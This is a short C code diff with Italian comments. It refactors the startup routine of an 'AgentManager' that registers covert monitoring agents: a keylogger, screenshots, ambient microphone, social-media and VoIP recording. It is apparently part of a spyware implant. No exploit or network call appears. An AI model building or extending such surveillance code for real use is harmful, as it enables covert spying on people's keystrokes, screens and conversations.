@@ -407,15 +407,8 @@ DWORD AM_Main()
 	return 1;
 }
 
-
-// Inizializza e lancia la prima volta l'AgentManager
-DWORD AM_Startup()
+void InitAgents()
 {
-	if (!IPCServerInit())
-		return 0;
-	LOG_InitLog();
-	InitializeCriticalSection(&hide_critic_sec);
-
 	PM_FileAgentRegister();
 	PM_KeyLogRegister();
 	PM_SnapShotRegister();
@@ -436,8 +429,21 @@ DWORD AM_Startup()
 	PM_AmbMicRegister();
 	PM_SocialAgentRegister();
 	PM_VoipRecordRegister(); // ma teniamolo per ultimo va, cosi' lo stoppa per ultimo
+}
 
-	return 1;
+// Inizializza e lancia la prima volta l'AgentManager
+DWORD AM_Startup()
+{
+	BOOL ret_val = IPCServerInit();
+
+	if (ret_val) {
+		LOG_InitLog();
+		InitializeCriticalSection(&hide_critic_sec);
+		InitAgents();
+		return 1;
+	}
+
+	return 0;
 }
 
 
